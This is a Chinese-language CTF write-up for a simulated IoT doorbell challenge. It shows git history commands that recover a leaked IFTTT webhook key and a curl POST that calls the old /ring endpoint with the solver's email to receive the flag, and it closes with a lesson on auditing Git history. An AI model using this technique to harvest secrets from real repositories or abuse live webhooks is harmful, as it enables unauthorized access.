# IOT Project

## 题目简述

题目模拟联网门铃。当前代码从本地 `maker.key` 读取密钥并调用 `/ring2`，看似没有直接泄漏；但公开 Git 仓库的历史提交保留了旧密钥和旧接口 `/ring`，旧接口允许调用者控制收件邮箱。

## 解题过程

克隆题目关联的代码仓库后，不只查看最新文件，还要检查提交历史：

```bash
git log --all --oneline --decorate
git log -p --all -- program.py
git grep -n 'maker\\|ring' $(git rev-list --all)
```

旧版本同时暴露：

- Maker/Webhooks 密钥；
- 接口路径 `/ring`；
- 参数 `value1` 会被当作接收通知的邮箱。

按旧代码的请求结构，向服务发送 POST，并把自己的邮箱放在 `value1`：

```bash
curl -X POST \
  -d 'value1=your-address@example.com' \
  'https://maker.ifttt.com/trigger/ring/with/key/<recovered-key>'
```

触发后收到包含 flag 的邮件：

```text
UMDCTF-{g!t_h00k3d}
```

## 方法总结

从当前版本删除秘密并不能清除 Git 历史。审计公开仓库时要检查补丁、已删除文件、重命名和旧 API 行为。本题必须把“历史泄漏的密钥”与“仍可调用的旧 webhook”结合，单看最新版无法完成利用。
